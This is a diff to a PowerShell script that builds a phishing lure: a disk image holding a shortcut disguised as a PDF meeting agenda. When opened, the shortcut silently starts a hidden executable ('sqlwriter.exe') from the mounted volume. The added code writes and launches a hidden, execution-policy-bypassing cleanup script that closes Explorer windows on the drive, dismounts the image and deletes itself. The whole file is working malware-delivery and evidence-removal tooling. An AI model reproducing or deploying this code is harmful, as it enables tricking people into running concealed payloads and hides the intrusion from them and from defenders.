@@ -1,8 +1,55 @@
 $IsoRoot = "C:\tmp\SHARE_1\DocShare"
 $VolumeName = "DocShare"
 $LnkPath = Join-Path $IsoRoot "Agenda_15-19_6-2026.pdf.lnk"
+$CleanupPath = Join-Path $IsoRoot "Microsoft\DocShare.ps1"
 
-$psCmd = '$d=(Get-CimInstance Win32_LogicalDisk|Where-Object {$_.VolumeName -eq ''' + $VolumeName + '''}|Select-Object -First 1).DeviceID;if($d){Start-Process -FilePath ($d+''\Microsoft\sqlwriter.exe'') -WindowStyle Hidden}'
+@'
+function ExitClean {
+    if ($PSCommandPath -and (Test-Path -LiteralPath $PSCommandPath)) {
+        Start-Process cmd.exe -ArgumentList "/c timeout /t 2 >nul & del ""$PSCommandPath""" -WindowStyle Hidden
+    }
+}
+
+Start-Sleep -Seconds 10
+$deadline = (Get-Date).AddSeconds(45)
+try {
+    do {
+        $v = Get-Volume -FileSystemLabel 'DocShare' -ErrorAction SilentlyContinue | Select-Object -First 1
+        if (-not $v -or -not $v.DriveLetter) {
+            break
+        }
+
+        $driveRoot = ('{0}:\' -f $v.DriveLetter)
+        try {
+            $shell = New-Object -ComObject Shell.Application
+            foreach ($window in @($shell.Windows())) {
+                try {
+                    $path = $window.Document.Folder.Self.Path
+                    if ($path -and $path.StartsWith($driveRoot, [System.StringComparison]::OrdinalIgnoreCase)) {
+                        $window.Quit()
+                    }
+                } catch { }
+            }
+        } catch { }
+
+        Start-Sleep -Milliseconds 500
+        try {
+            Get-DiskImage -Volume $v -ErrorAction Stop | Dismount-DiskImage -ErrorAction Stop
+            break
+        } catch {
+            Start-Sleep -Seconds 2
+        }
+    } while ((Get-Date) -lt $deadline)
+} finally {
+    ExitClean
+}
+'@ | Set-Content -LiteralPath $CleanupPath -Encoding ASCII
+
+$psCmd = @(
+    '$vol=''DocShare'''
+    '$d=(Get-CimInstance Win32_LogicalDisk|Where-Object {$_.VolumeName -eq $vol}|Select-Object -First 1).DeviceID'
+    'if($d){Start-Process -FilePath ($d+''\Microsoft\sqlwriter.exe'') -WindowStyle Hidden;$cleanup=Join-Path $env:TEMP ''DocShare.ps1'';Copy-Item -LiteralPath ($d+''\Microsoft\DocShare.ps1'') -Destination $cleanup -Force -ErrorAction SilentlyContinue;Start-Process powershell.exe -WindowStyle Hidden -WorkingDirectory $env:TEMP -ArgumentList @(''-nop'',''-w'',''hidden'',''-ep'',''bypass'',''-File'',$cleanup)}'
+) -join ';'
 
 $WshShell = New-Object -ComObject WScript.Shell
 $Shortcut = $WshShell.CreateShortcut($LnkPath)
@@ -15,3 +62,4 @@ $Shortcut.Description = "Agenda_15-19_6-2026.pdf"
 $Shortcut.Save()
 
 Write-Host "[+] Created: $LnkPath"
+Write-Host "[+] Created: $CleanupPath"
